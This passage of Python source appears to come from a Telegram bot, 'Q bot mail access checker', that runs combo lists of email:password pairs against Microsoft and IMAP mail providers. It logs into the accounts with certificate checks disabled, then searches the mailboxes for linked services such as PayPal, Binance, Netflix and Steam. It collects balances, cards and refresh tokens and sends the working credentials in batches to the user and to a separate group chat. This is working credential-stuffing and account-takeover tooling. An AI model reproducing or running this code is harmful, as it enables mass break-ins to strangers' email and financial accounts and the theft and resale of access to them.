        q = "@epicgames.com OR Epic Games"
        total = self._search_count(access_token, cid, q, timeout=10)
        return {"epic_status": "LINKED" if total > 0 else "FREE", "epic_emails": total}

    def _search_service_detail(self, access_token, cid, email_addr, query, imap_substr):
        try:
            url = "https://outlook.live.com/search/api/v2/query"
            h = {
                'User-Agent': 'Outlook-Android/2.0',
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Content-Type': 'application/json'
            }
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [
                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                        {"Term": {"DistinguishedFolderName": "DeletedItems"}},
                        {"Term": {"DistinguishedFolderName": "Inbox"}}
                    ]},
                    "From": 0,
                    "Query": {"QueryString": query},
                    "Size": 50,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            r = self.session.post(url, json=payload, headers=h, timeout=10)
            if r.status_code == 200:
                data = r.json()
                total = 0
                last_s = ""
                last_d = ""
                for es in data.get('EntitySets', []):
                    for rs in es.get('ResultSets', []):
                        total = rs.get('Total', 0)
                        if total > 0 and rs.get('Results'):
                            last = rs['Results'][0]
                            last_s = last.get('Subject', '')
                            last_d = last.get('ReceivedDateTime', '')
                        break
                if not last_s or not last_d:
                    s2, d2 = self._imap_fetch_latest_from(email_addr, access_token, imap_substr)
                    if s2: last_s = s2
                    if d2: last_d = d2
                return {"status": "LINKED" if total > 0 else "FREE", "emails": total, "last_subject": last_s[:100], "last_date": last_d[:20]}
            return {"status": "FREE", "emails": 0}
        except:
            return {"status": "ERROR", "emails": 0}

    def check_service(self, access_token, cid, query_str):
        try:
            url = "https://outlook.live.com/search/api/v2/query"
            h = {
                'User-Agent': 'Outlook-Android/2.0',
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Content-Type': 'application/json'
            }
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [
                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                        {"Term": {"DistinguishedFolderName": "DeletedItems"}},
                        {"Term": {"DistinguishedFolderName": "Inbox"}}
                    ]},
                    "From": 0,
                    "Query": {"QueryString": query_str},
                    "Size": 50,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            r = self.session.post(url, json=payload, headers=h, timeout=10)
            if r.status_code == 200:
                data = r.json()
                total = 0
                for es in data.get('EntitySets', []):
                    for rs in es.get('ResultSets', []):
                        total = rs.get('Total', 0)
                        break
                return total > 0
            return False
        except:
            return False

    def check(self, email, password):
        try:
            auth = self._ms_hard_login(email, password)
            if not auth or not auth.get("access_token"):
                return {"status": "BAD"}
            at = auth["access_token"]
            cid = auth.get("cid", "")
            country, name = self._profile(at, cid)
            msg_count = self._graph_msg_count(at)
            msr = self.check_microsoft_subscriptions(email, password, at, cid)
            found_services = {}
            nf = self.check_netflix(at, cid, email)
            if nf.get("netflix_status") == "LINKED":
                found_services["Netflix"] = True
            fb = self.check_facebook(at, cid, email)
            if fb.get("facebook_status") == "LINKED":
                found_services["Facebook"] = True
            service_details = {}
            for q, svc_name in (self.services_map or {}).items():
                if svc_name in ("Netflix", "Facebook"):
                    continue
                info = self._search_service_detail(at, cid, email, q, q)
                service_details[svc_name] = info
                if info.get("status") == "LINKED":
                    found_services[svc_name] = True

            result = {
                "status": "HIT",
                "country": country,
                "name": name,
                "msg_count": msg_count,
                "email": email,
                "password": password,
                "services": found_services,
                "service_details": service_details,
                "_access_token": at,
                "_cid": cid,
                "_refresh_token": auth.get("refresh_token", ""),
                **msr,
                **nf,
                **fb,
                "psn_status": "NONE",
                "steam_status": "NONE",
                "supercell_status": "NONE",
                "tiktok_status": "NONE",
                "minecraft_status": "NONE",
                "hypixel_status": "NOT_FOUND",
            }
            return result
        except requests.exceptions.Timeout:
            return {"status": "BAD"}
        except Exception:
            return {"status": "BAD"}

def build_balance_text(ms_data):
    parts = []
    if isinstance(ms_data, dict):
        if "balances" in ms_data:
            parts.extend(ms_data["balances"])
        elif "balance_amount" in ms_data:
            amt = ms_data.get("balance_amount")
            cur = ms_data.get("balance_currency") or ""
            parts.append(format_currency(amt, cur or None))
        
        if "cards" in ms_data and ms_data["cards"]:
            parts.append("Cards: " + ", ".join(ms_data["cards"]))
            
        if "rewards_points" in ms_data:
            parts.append(f"Rewards:{ms_data['rewards_points']}")
    return " | ".join([p for p in parts if p]) if parts else "0.0 USD"

def format_result(res):
    email = res.get("email", "")
    password = res.get("password", "")
    country = (res.get("country") or "??").strip().upper()
    parts = [f"{email}:{password}", country]
    xbox = res.get("xbox", {}) or {}
    xdet = xbox.get("details") or ""
    if xdet and (xbox.get("status","").upper() != "FREE"):
        parts.append(f"Xbox: {xdet}")
    balance_text = build_balance_text(res.get("ms_data", {}))
    if balance_text:
        parts.append(balance_text)
    services = res.get("services", {}) or {}
    svc_list = [k for k, v in services.items() if v]
    if svc_list:
        svc_text = ", ".join(svc_list[:10]) + ("..." if len(svc_list) > 10 else "")
        parts.append(svc_text)
    return " | ".join(parts)

def _take(lst, n):
    out = []
    for i, v in enumerate(lst):
        if i >= n:
            break
        out.append(v)
    return out

def format_full_details(res):
    lines = []
    email = res.get("email", "")
    country = (res.get("country") or "??").strip().upper()
    name = res.get("name") or ""
    msg_count = res.get("msg_count", 0)
    lines.append(f"Email: {email}")
    lines.append(f"Name: {name}")
    lines.append(f"Country: {country}")
    lines.append(f"Msgs: {msg_count}")
    xbox = res.get("xbox", {}) or {}
    if xbox:
        lines.append(f"Xbox: {xbox.get('details') or xbox.get('status') or 'N/A'}")
    ms = res.get("ms_data", {}) or {}
    btxt = build_balance_text(ms)
    if btxt:
        lines.append(f"Microsoft: {btxt}")
    if res.get("psn_status") == "HAS_ORDERS":
        cnt = res.get("psn_emails_count", 0)
        orders = res.get("psn_orders", 0)
        ids = res.get("psn_online_ids", []) or []
        lines.append(f"PSN: emails:{cnt} orders:{orders} ids:{', '.join(_take(ids,5))}")
    if res.get("steam_status") == "HAS_PURCHASES":
        cnt = res.get("steam_count", 0)
        games = [p.get("game","") for p in res.get("steam_purchases", []) or []]
        if games:
            lines.append(f"Steam: {cnt} [{'; '.join(_take(games,10))}]")
        else:
            lines.append(f"Steam: {cnt}")
    if res.get("minecraft_status") == "OWNED":
        uname = res.get("minecraft_username","")
        lines.append(f"Minecraft: {uname}")
    if res.get("hypixel_status") == "FOUND":
        hp = []
        if res.get("hypixel_level"):
            hp.append(f"Lvl:{res['hypixel_level']}")
        if res.get("hypixel_bw_stars"):
            hp.append(f"BW★{res['hypixel_bw_stars']}")
        if res.get("hypixel_sb_coins"):
            hp.append(f"SB:{res['hypixel_sb_coins']}")
        if hp:
            lines.append(f"Hypixel: {' | '.join(hp)}")
    if res.get("netflix_status") == "LINKED":
        lines.append(f"Netflix: {res.get('netflix_emails',0)} | {res.get('netflix_last_subject','')[:100]} | {res.get('netflix_last_date','')}")
    if res.get("facebook_status") == "LINKED":
        lines.append(f"Facebook: {res.get('facebook_emails',0)} | {res.get('facebook_last_subject','')[:100]} | {res.get('facebook_last_date','')}")
    if res.get("dazn_status") == "LINKED":
        lines.append(f"Dazn: {res.get('dazn_emails',0)} | {res.get('dazn_last_subject','')[:100]} | {res.get('dazn_last_date','')}")
    if res.get("paypal_status") == "LINKED":
        lines.append(f"PayPal: emails:{res.get('paypal_emails',0)} payments:{res.get('paypal_total_payments',0)}")
    if res.get("epic_status") == "LINKED":
        lines.append(f"Epic: {res.get('epic_emails',0)} | {res.get('epic_last_subject','')[:100]} | {res.get('epic_last_date','')}")
    sv = res.get("services", {}) or {}
    if sv:
        found = [k for k,v in sv.items() if v]
        lines.append(f"Services: {', '.join(_take(found,20))}" + (" ..." if len(found)>20 else ""))
    out = "\n".join(lines)
    if len(out) > 3900:
        out = out[:3900] + "\n..."
    return out

# ------------------- IMAP Checker -------------------
IMAP_SERVERS = {
    "gmail.com": {"host": "imap.gmail.com", "port": 993},
    "yahoo.com": {"host": "imap.mail.yahoo.com", "port": 993},
    "icloud.com": {"host": "imap.mail.me.com", "port": 993},
    "aol.com": {"host": "imap.aol.com", "port": 993},
    "zoho.com": {"host": "imap.zoho.com", "port": 993},
    "fastmail.com": {"host": "imap.fastmail.com", "port": 993},
    "yandex.com": {"host": "imap.yandex.com", "port": 993},
    "yandex.ru": {"host": "imap.yandex.ru", "port": 993},
    "mail.ru": {"host": "imap.mail.ru", "port": 993},
    "bk.ru": {"host": "imap.mail.ru", "port": 993},
    "list.ru": {"host": "imap.mail.ru", "port": 993},
    "inbox.ru": {"host": "imap.mail.ru", "port": 993},
    "gmx.net": {"host": "imap.gmx.net", "port": 993},
    "gmx.com": {"host": "imap.gmx.com", "port": 993},
    "web.de": {"host": "imap.web.de", "port": 993},
    "t-online.de": {"host": "imap.t-online.de", "port": 993},
    "qq.com": {"host": "imap.qq.com", "port": 993},
    "163.com": {"host": "imap.163.com", "port": 993},
    "126.com": {"host": "imap.126.com", "port": 993},
    "protonmail.com": {"host": "imap.protonmail.com", "port": 993},
    "proton.me": {"host": "imap.proton.me", "port": 993},
}

IMAP_SERVICES = {
    "Netflix": "netflix.com", "Spotify": "spotify.com", "Discord": "discord.com",
    "Steam": "steampowered.com", "Epic Games": "epicgames.com", "Roblox": "roblox.com",
    "PayPal": "paypal.com", "Amazon": "amazon.com", "eBay": "ebay.com",
    "Facebook": "facebookmail.com", "Instagram": "instagram.com", "Twitter": "x.com",
    "TikTok": "tiktok.com", "YouTube": "youtube.com", "Twitch": "twitch.tv",
    "Binance": "binance.com", "Coinbase": "coinbase.com", "Airbnb": "airbnb.com",
    "Uber": "uber.com", "PlayStation": "playstation.com", "Xbox": "xbox.com",
    "Minecraft": "mojang.com", "Blizzard": "blizzard.com", "Riot Games": "riotgames.com",
    "Adobe": "adobe.com", "GitHub": "github.com", "Google": "google.com",
    "Apple": "apple.com", "Microsoft": "microsoft.com", "Dropbox": "dropbox.com",
    "Zoom": "zoom.us", "LinkedIn": "linkedin.com", "Reddit": "reddit.com",
    "Snapchat": "snapchat.com", "Pinterest": "pinterest.com",
}

def _decode_mime(text):
    if not text:
        return ""
    parts = decode_hdr(text)
    result = []
    for part, enc in parts:
        if isinstance(part, bytes):
            try:
                result.append(part.decode(enc or 'utf-8', errors='ignore'))
            except:
                result.append(part.decode('utf-8', errors='ignore'))
        else:
            result.append(str(part))
    return ''.join(result)

def _get_imap_config(email_addr):
    domain = email_addr.lower().split('@')[-1]
    if domain in IMAP_SERVERS:
        return IMAP_SERVERS[domain]
    return {"host": f"imap.{domain}", "port": 993}

def _imap_connect(email_addr, password):
    cfg = _get_imap_config(email_addr)
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        mail = imaplib.IMAP4_SSL(cfg['host'], cfg['port'],
                                  ssl_context=ctx)
        mail.socket().settimeout(12)
        res, _ = mail.login(email_addr, password)
        if res != 'OK':
            try: mail.logout()
            except: pass
            return None
        return mail
    except (imaplib.IMAP4.error, ssl.SSLError,
            OSError, ConnectionRefusedError,
            TimeoutError, Exception):
        return None

class ImapChecker:
    def __init__(self):
        self.hits = 0
        self._lock = threading.Lock()

    def check(self, email_addr, password, target_keywords=None):
        try:
            mail = _imap_connect(email_addr, password)
            if not mail:
                return {"status": "BAD"}
            # Count inbox
            msg_count = 0
            try:
                r, _ = mail.select('INBOX')
                if r == 'OK':
                    r2, data2 = mail.search(None, 'ALL')
                    if r2 == 'OK' and data2 and data2[0]:
                        msg_count = len(data2[0].split())
            except Exception:
                pass
            # Scan services AND target keywords in one pass
            services_found, kw_counts = self._scan_services(mail, target_keywords or [])
            try:
                mail.logout()
            except Exception:
                pass
            with self._lock:
                self.hits += 1
            return {
                "status": "HIT",
                "email": email_addr,
                "country": "",
                "name": "",
                "msg_count": msg_count,
                "xbox": {"status": "N/A"},
                "ms_data": {},
                "services": {svc: True for svc in services_found},
                "kw_counts": kw_counts,
                "imap_mode": True,
                "psn_status": "NONE",
                "steam_status": "NONE",
                "supercell_status": "NONE",
                "tiktok_status": "NONE",
                "minecraft_status": "NONE",
                "hypixel_status": "NOT_FOUND",
            }
        except Exception:
            return {"status": "BAD"}

    def _scan_services(self, mail, target_keywords=None):
        found = set()
        kw_counts = {kw: 0 for kw in (target_keywords or [])}
        try:
            r, data = mail.search(None, 'ALL')
            if r != 'OK' or not data[0]:
                return list(found), kw_counts
            ids = data[0].split()
            for eid in ids[-500:]:
                try:
                    r2, mdata = mail.fetch(eid, '(BODY.PEEK[HEADER])')
                    if r2 != 'OK' or not mdata or not mdata[0]:
                        continue
                    raw = mdata[0][1] if isinstance(mdata[0], tuple) else b''
                    msg = email_lib.message_from_bytes(raw)
                    sender = _decode_mime(msg.get('From', '')).lower()
                    subject = _decode_mime(msg.get('Subject', '')).lower()
                    for svc, pattern in IMAP_SERVICES.items():
                        if pattern in sender:
                            found.add(svc)
                    # Check user target keywords
                    for kw in (target_keywords or []):
                        k = kw.lower().strip()
                        if k and (k in sender or k in subject):
                            kw_counts[kw] = kw_counts.get(kw, 0) + 1
                except:
                    continue
        except:
            pass
        return list(found), kw_counts

def _imap_fetch_emails(email_addr, password, folder='INBOX', count=100, cancel_event=None):
    """Fetch last N emails from a folder via IMAP"""
    emails = []
    try:
        mail = _imap_connect(email_addr, password)
        if not mail:
            return None, "Login failed (wrong password or domain not reachable)"
        r, _ = mail.select(folder, readonly=True)
        if r != 'OK':
            # Try common alternate folder names
            alt_names = {
                'Trash': ['Deleted Items', 'Deleted', '[Gmail]/Trash',
                           'INBOX.Trash', 'Корзина'],
                'Sent':  ['Sent Items', '[Gmail]/Sent Mail',
                           'INBOX.Sent', 'Отправленные'],
                'Junk':  ['Spam', '[Gmail]/Spam', 'INBOX.Spam',
                           'Bulk Mail', 'Нежелательная почта'],
                'Drafts':['[Gmail]/Drafts', 'INBOX.Drafts'],
            }
            opened = False
            for alt in alt_names.get(folder, []):
                try:
                    r2, _ = mail.select(alt, readonly=True)
                    if r2 == 'OK':
                        opened = True
                        break
                except Exception:
                    continue
            if not opened:
                try: mail.logout()
                except: pass
                return None, f"Cannot open folder: {folder}"
        r2, data2 = mail.search(None, 'ALL')
        if r2 != 'OK':
            mail.logout()
            return None, "Search failed"
        ids = data2[0].split() if data2[0] else []
        # Get last `count` emails
        fetch_ids = ids[-count:] if len(ids) > count else ids
        fetch_ids = list(reversed(fetch_ids))  # newest first
        for eid in fetch_ids:
            if cancel_event and cancel_event.is_set():
                break
            try:
                r3, mdata = mail.fetch(eid, '(RFC822)')
                if r3 != 'OK' or not mdata:
                    continue
                raw = mdata[0][1] if isinstance(mdata[0], tuple) else b''
                msg = email_lib.message_from_bytes(raw)
                subject = _decode_mime(msg.get('Subject', '(No Subject)'))
                sender = _decode_mime(msg.get('From', ''))
                date = msg.get('Date', '')
                body = ''
                if msg.is_multipart():
                    for part in msg.walk():
                        ct = part.get_content_type()
                        if ct == 'text/plain':
                            try:
                                body = part.get_payload(decode=True).decode('utf-8', errors='ignore')
                                break
                            except:
                                pass
                        elif ct == 'text/html' and not body:
                            try:
                                html = part.get_payload(decode=True).decode('utf-8', errors='ignore')
                                body = re.sub(r'<[^>]+>', ' ', html)
                            except:
                                pass
                else:
                    try:
                        body = msg.get_payload(decode=True).decode('utf-8', errors='ignore')
                    except:
                        body = str(msg.get_payload())
                emails.append({
                    'subject': subject[:120],
                    'from': sender[:80],
                    'date': date[:40],
                    'body': body[:3000],
                })
            except:
                continue
        mail.logout()
        return emails, None
    except Exception as e:
        return None, str(e)

class ScanSession:
    def __init__(self, chat_id):
        self.chat_id = chat_id
        self.stop_ev = threading.Event()
        self.results = []                 # hit lines
        self.results_services = []        # services-only lines
        self.results_xbox = []            # xbox premium-only lines
        self.total = 0
        self.checked = 0
        self.hits = 0
        self.bads = 0
        self.batch = []                   # hit lines batch
        self.batch_services = []          # services-only batch
        self.batch_xbox = []              # xbox premium-only batch
        self.hits_batch_lock = threading.Lock()
        self.last_status_time = 0.0
        self.awaiting_domain = False
        self.custom_domain = None
        self.custom_domains = []          # multiple custom targets (comma-separated input)
        self.pending_accounts = None
        self.status_msg_id = None
        self.xbox_premium = 0
        self.country_counts = {}
        self.service_counts = {}
        self.awaiting_vip_code = False # New: Flag for VIP code entry
        self.is_imap = False      # New: Flag for IMAP/Another mode
        self.accounts_microsoft = [] # accounts to scan in MS mode
        self.accounts_another = []   # accounts to scan in IMAP mode
        self.imap_hits_by_domain = {} # domain -> hit_count for status msg
        self.chunks_dir = None
        self.country_results = {}
        self.username = ""
        self.plan = ""
        # Separate counters for MS and MIX
        self.ms_checked = 0
        self.ms_hits = 0
        self.ms_bads = 0
        self.ms_service_counts = {}
        self.ms_status_msg_id = None
        self.mix_checked = 0
        self.mix_hits = 0
        self.mix_bads = 0
        self.mix_service_counts = {}
        self.mix_status_msg_id = None
        # VIP search flow
        self.awaiting_search = False
        self.search_keywords = []
        self.search_results = []
        self.search_status_msg_id = None
        # VIP target keyword tracking (during scan)
        self.awaiting_target_keywords = False   # asking VIP user for scan target keywords
        self.target_keywords = []               # e.g. ["netflix", "facebook.com"]
        self.ms_target_counts = {}              # kw -> count for MS accounts
        self.mix_target_counts = {}             # kw -> count for MIX/IMAP accounts
        self.batch_mix = []                     # IMAP/MIX hits batch (separate from MS)
        self.batch_target_ms = []               # MS accounts matching target keywords
        self.batch_target_mix = []              # MIX accounts matching target keywords
        self.ms_hits_last_flush = 0             # MS hit count at last 100-batch flush
        self.mix_hits_last_flush = 0            # MIX hit count at last 100-batch flush

    def stop(self):
        self.stop_ev.set()

class BotApp:
    def __init__(self):
        self.offset = None
        self.sessions = {}
        self.lock = threading.Lock()
    
    def _send_search_status(self, sess: ScanSession, chat_id, keywords, force=False):
        now = time.time()
        if not force and now - sess.last_status_time < 5:
            return
        vip_tag = " [VIP]" if chat_id in vip_users_info else ""
        # Microsoft-style message
        countries_ms = ", ".join([f"{k}:{v}" for k, v in sorted(sess.country_counts.items(), key=lambda x: (-x[1], x[0]))[:10]]) or "-"
        services_ms = ", ".join([f"{k}:{v}" for k, v in sorted(sess.ms_service_counts.items(), key=lambda x: (-x[1], x[0]))[:5]]) or "-"
        tgt_ms = ", ".join([f"{k}:{sess.ms_search_counts.get(k,0)}" for k in keywords]) or "-"
        ms_msg = (
            f"Q bot mail access checker{vip_tag}\n"
            f"check microsoft ( hotmail , outlook , etc )\n"
            f"hits : {sess.ms_hits}\n"
            f"bad : {sess.ms_bads}\n"
            f"xbox : {sess.xbox_premium}\n"
            f"country : {countries_ms}\n"
            f"services : {services_ms}\n"
            f"Your target keywords: {tgt_ms}\n"
            "By : anon\n"
            "channel : @anon_main1"
        )
        # MIX-style message
        types_str = ", ".join([f"{dom}:{count}" for dom, count in sess.imap_hits_by_domain.items()]) or "-"
        services_mix = ", ".join([f"{k}:{v}" for k, v in sorted(sess.mix_service_counts.items(), key=lambda x: (-x[1], x[0]))[:5]]) or "-"
        tgt_mix = ", ".join([f"{k}:{sess.mix_search_counts.get(k,0)}" for k in keywords]) or "-"
        mix_msg = (
            f"Q bot mail access checker{vip_tag}\n"
            f"check mix ( t-online.de , gmx , etc )\n"
            f"hits : {sess.mix_hits}\n"
            f"bad : {sess.mix_bads}\n"
            f"type : {types_str}\n"
            f"services : {services_mix}\n"
            f"Your target keywords: {tgt_mix}\n"
            "By : anon\n"
            "channel : @anon_main1"
        )
        # send or edit both
        if getattr(sess, "ms_search_msg_id", None):
            try: edit_message(chat_id, sess.ms_search_msg_id, ms_msg)
            except: pass
        else:
            try:
                r = send_message(chat_id, ms_msg)
                sess.ms_search_msg_id = r.get("result", {}).get("message_id")
            except: pass
        if getattr(sess, "mix_search_msg_id", None):
            try: edit_message(chat_id, sess.mix_search_msg_id, mix_msg)
            except: pass
        else:
            try:
                r = send_message(chat_id, mix_msg)
                sess.mix_search_msg_id = r.get("result", {}).get("message_id")
            except: pass
        sess.last_status_time = now
    
    def start_search(self, chat_id, accounts, keywords):
        with self.lock:
            sess = self.sessions.get(chat_id)
            if not sess:
                sess = ScanSession(chat_id)
                self.sessions[chat_id] = sess
        sess.search_results = []
        sess.ms_search_counts = {}
        sess.mix_search_counts = {}
        self._send_search_status(sess, chat_id, keywords, force=True)
        
        ms_domains = ('outlook.', 'hotmail.', 'live.', 'msn.', 'windowslive.')
        def worker(acc):
            if sess.stop_ev.is_set():
                return
            em, pw = acc
            is_ms = any(d in em for d in ms_domains)
            if is_ms:
                try:
                    checker = UnifiedChecker(debug=False)
                    auth = checker._ms_hard_login(em, pw)
                    if not auth or not auth.get("access_token"):
                        return
                    at = auth["access_token"]; cid = auth.get("cid", "")
                    found_any = False
                    for kw in keywords:
                        total = checker._search_count(at, cid, kw, timeout=10)
                        if total > 0:
                            found_any = True
                            with self.lock:
                                sess.ms_search_counts[kw] = sess.ms_search_counts.get(kw, 0) + total
                    if found_any:
                        kvs = [f"{kw}:{sess.ms_search_counts.get(kw,0)}" for kw in keywords]
                        line = f"{em}:{pw} | " + ", ".join(kvs)
                        with self.lock:
                            sess.search_results.append(line)
                except:
                    pass
            else:
                # IMAP keyword scan for MIX accounts
                try:
                    mail = _imap_connect(em, pw)
                    if not mail:
                        return
                    r, data = mail.search(None, 'ALL')
                    if r != 'OK' or not data or not data[0]:
                        try: mail.logout()
                        except: pass
                        return
                    ids = data[0].split()
                    counts = {kw: 0 for kw in keywords}
                    for eid in ids[-500:]:
                        try:
                            r2, mdata = mail.fetch(eid, '(BODY.PEEK[HEADER])')
                            if r2 != 'OK' or not mdata or not mdata[0]:
                                continue
                            raw = mdata[0][1] if isinstance(mdata[0], tuple) else b''
                            msg = email_lib.message_from_bytes(raw)
                            sender = (_decode_mime(msg.get('From', '')) or '').lower()
                            subject = (_decode_mime(msg.get('Subject', '')) or '').lower()
                            for kw in keywords:
                                k = kw.lower()
                                if k in sender or k in subject:
                                    counts[kw] += 1
                        except:
                            continue
                    try: mail.logout()
                    except: pass
                    if any(v > 0 for v in counts.values()):
                        with self.lock:
                            for kw, c in counts.items():
                                if c > 0:
                                    sess.mix_search_counts[kw] = sess.mix_search_counts.get(kw, 0) + c
                            kvs = [f"{kw}:{counts.get(kw,0)}" for kw in keywords]
                            line = f"{em}:{pw} | " + ", ".join(kvs)
                            sess.search_results.append(line)
                except:
                    pass
        
        max_w = max(8, min(64, (os.cpu_count() or 4) * 4))
        ex = ThreadPoolExecutor(max_workers=max_w)
        fs = [ex.submit(worker, acc) for acc in accounts]
        try:
            pending = set(fs)
            while pending and not sess.stop_ev.is_set():
                done = {f for f in list(pending) if f.done()}
                pending -= done
                self._send_search_status(sess, chat_id, keywords)
                time.sleep(0.5)
        finally:
            try: ex.shutdown(wait=False, cancel_futures=True)
            except: pass
        
        # write separate results file (not merged with scan results)
        try:
            name = f"search_{uuid.uuid4().hex[:8]}.txt"
            path = os.path.join(os.getcwd(), name)
            with open(path, "w", encoding="utf-8") as f:
                for ln in sess.search_results:
                    f.write(ln + " | BY : @T_Q_mailbot\n")
            send_document(chat_id, path, caption=f"Search done. Matches: {len(sess.search_results)}")
        finally:
            try: os.remove(path)
            except: pass

    def _send_status(self, sess: ScanSession, chat_id, force=False):
        now = time.time()
        if not force and now - sess.last_status_time < 5:
            return
        
        is_vip = (chat_id in vip_users_info)
        vip_tag = " [VIP]" if is_vip else ""
        
        with self.lock:
            # Microsoft status
            countries_ms = ", ".join([f"{k}:{v}" for k, v in sorted(sess.country_counts.items(), key=lambda x: (-x[1], x[0]))[:10]]) or "-"
            services_ms = ", ".join([f"{k}:{v}" for k, v in sorted(sess.ms_service_counts.items(), key=lambda x: (-x[1], x[0]))[:5]]) or "-"
            # Target keywords line for MS
            if sess.target_keywords:
                tgt_ms = ", ".join([f"{kw}({sess.ms_target_counts.get(kw, 0)})" for kw in sess.target_keywords])
                ms_target_line = f"your target : {tgt_ms}\n"
            else:
                ms_target_line = ""
            ms_msg = (
                f"Q bot mail access checker{vip_tag}\n"
                f"check microsoft ( hotmail , outlook , etc )\n"
                f"hits : {sess.ms_hits}\n"
                f"bad : {sess.ms_bads}\n"
                f"xbox : {sess.xbox_premium}\n"
                f"country : {countries_ms}\n"
                f"services : {services_ms}\n"
                f"{ms_target_line}"
                "By : anon\n"
                "channel : @anon_main1"
            )
            # MIX status
            mix_emails_found = sum(sess.imap_hits_by_domain.values()) if sess.imap_hits_by_domain else sess.mix_hits
            services_mix = ", ".join([f"{k}:{v}" for k, v in sorted(sess.mix_service_counts.items(), key=lambda x: (-x[1], x[0]))[:5]]) or "-"
            # Target keywords line for MIX
            if sess.target_keywords:
                tgt_mix = ", ".join([f"{kw}({sess.mix_target_counts.get(kw, 0)})" for kw in sess.target_keywords])
                mix_target_line = f"your target : {tgt_mix}\n"
            else:
                mix_target_line = ""
            mix_msg = (
                f"Q bot mail access checker{vip_tag}\n"
                f"check mix ( t-online.de , gmx , etc )\n"
                f"hits : {sess.mix_hits}\n"
                f"bad : {sess.mix_bads}\n"
                f"emails found : {mix_emails_found}\n"
                f"services : {services_mix}\n"
                f"{mix_target_line}"
                "By : anon\n"
                "channel : @anon_main1"
            )
        # Send/edit MS status
        if sess.ms_status_msg_id:
            try: edit_message(chat_id, sess.ms_status_msg_id, ms_msg)
            except: pass
        else:
            try:
                r = send_message(chat_id, ms_msg)
                sess.ms_status_msg_id = r.get("result", {}).get("message_id")
            except Exception:
                pass
        # Send/edit MIX status
        if sess.mix_status_msg_id:
            try: edit_message(chat_id, sess.mix_status_msg_id, mix_msg)
            except: pass
        else:
            try:
                r = send_message(chat_id, mix_msg)
                sess.mix_status_msg_id = r.get("result", {}).get("message_id")
            except Exception:
                pass
        sess.last_status_time = now

    def _flush_batch(self, sess: ScanSession, chat_id, flush_all=False):
        with sess.hits_batch_lock:
            try:
                vip_tag = " [VIP]" if chat_id in vip_users_info else ""
                user_tag = sess.username or str(chat_id)
                FLUSH_SIZE = 100

                def send_with_retries(path, caption):
                    for i in range(3):
                        try:
                            resp = send_document(chat_id, path, caption=caption)
                            if isinstance(resp, dict) and not resp.get("ok", False):
                                raise RuntimeError("send failed")
                            return True
                        except:
                            time.sleep(2 * (i + 1))
                    return False

                def send_batches(lines, file_prefix, caption_label, force_all=False):
                    """Send lines in chunks of FLUSH_SIZE with descriptive captions."""
                    while len(lines) >= FLUSH_SIZE:
                        chunk = lines[:FLUSH_SIZE]
                        fname = f"{file_prefix}_{chat_id}_{uuid.uuid4().hex[:6]}.txt"
                        xpath = os.path.join(os.getcwd(), fname)
                        with open(xpath, "w", encoding="utf-8") as f:
                            f.writelines([ln + " | BY : @T_Q_mailbot\n" for ln in chunk])
                        ok = send_with_retries(xpath, caption=f"📄 {caption_label} | {FLUSH_SIZE} hits")
                        if ok:
                            try:
                                send_document(GROUP_ID, xpath, caption=f"{user_tag}{vip_tag} | {caption_label} ({FLUSH_SIZE})")
                            except: pass
                            try: os.remove(xpath)
                            except: pass
                            del lines[:FLUSH_SIZE]
                        else:
                            try: os.remove(xpath)
                            except: pass
                            break
                    if force_all and lines:
                        chunk = lines[:]
                        fname = f"{file_prefix}_{chat_id}_{uuid.uuid4().hex[:6]}.txt"
                        xpath = os.path.join(os.getcwd(), fname)
                        with open(xpath, "w", encoding="utf-8") as f:
                            f.writelines([ln + " | BY : @T_Q_mailbot\n" for ln in chunk])
                        ok = send_with_retries(xpath, caption=f"📄 {caption_label} | {len(chunk)} hits")
                        if ok:
                            try:
                                send_document(GROUP_ID, xpath, caption=f"{user_tag}{vip_tag} | {caption_label} ({len(chunk)})")
                            except: pass
                            try: os.remove(xpath)
                            except: pass
                            lines.clear()
                        else:
                            try: os.remove(xpath)
                            except: pass

                # Microsoft hits
                send_batches(sess.batch, "ms_hits", "Microsoft Hits", force_all=flush_all)
                # Xbox premium (separate file)
                send_batches(sess.batch_xbox, "xbox", "Xbox Premium", force_all=flush_all)
                # MIX/IMAP hits (separate file)
                send_batches(sess.batch_mix, "mix_hits", "MIX / IMAP Hits", force_all=flush_all)
                # Target keyword MS hits (separate file)
                if sess.target_keywords:
                    kw_label = ", ".join(sess.target_keywords[:3])
                    send_batches(sess.batch_target_ms, "target_ms", f"MS Target [{kw_label}]", force_all=flush_all)
                    send_batches(sess.batch_target_mix, "target_mix", f"MIX Target [{kw_label}]", force_all=flush_all)
            except:
                pass

    def start_scan(self, chat_id, accounts):
        with self.lock:
            sess = self.sessions.get(chat_id)
            if not sess:
                sess = ScanSession(chat_id)
                self.sessions[chat_id] = sess
        
        sess.total = len(accounts)
        sess.checked = 0
        sess.hits = 0
        sess.bads = 0
        sess.results.clear()
        sess.country_results.clear()
        
        kb = {"inline_keyboard": [[{"text": "Stop", "callback_data": f"STOP_{chat_id}"}]]}
        mode_name = "Mail Access"
        
        is_vip = (chat_id in vip_users_info)
        vip_tag = " [VIP]" if is_vip else ""
        
        send_message(chat_id, f"Started {mode_name} scan: {sess.total} accounts{vip_tag}", reply_markup=kb)
        self._send_status(sess, chat_id, force=True)

        def run_batch(sub_accounts):
            def worker(acc):
                if sess.stop_ev.is_set():
                    return
                em, pw = acc
                ms_domains = ('outlook.', 'hotmail.', 'live.', 'msn.', 'windowslive.')
                is_ms = any(d in em for d in ms_domains)
                if not is_ms:
                    # -------- MIX / IMAP branch --------
                    try:
                        checker = ImapChecker()
